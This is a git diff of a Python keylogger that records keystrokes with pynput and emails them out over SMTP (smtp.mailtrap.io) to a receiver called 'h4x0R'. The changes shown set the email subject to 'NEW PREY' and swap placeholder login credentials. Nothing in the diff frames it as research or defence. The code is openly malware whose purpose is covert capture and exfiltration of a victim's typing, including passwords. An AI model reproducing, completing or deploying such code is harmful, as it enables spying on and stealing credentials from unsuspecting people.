@@ -2,13 +2,12 @@ import pynput
 from pynput.keyboard import Key, Listener
 import smtplib
 
-
 sender = "TKlogg Prey"
 receiver = "h4x0R"
 keys = []
 
 message = f"""\
-Subject: Hi Mailtrap
+Subject: NEW PREY
 To: {receiver}
 From: {sender}
 
@@ -20,7 +19,7 @@ def writeFile(key):
 
 def sendMail():
     server = smtplib.SMTP("smtp.mailtrap.io", 2525)
-    server.login("mail", "pass")
+    server.login("email", "password")
     server.sendmail(sender, receiver, message + str(keys))
 
 def onPress(key):
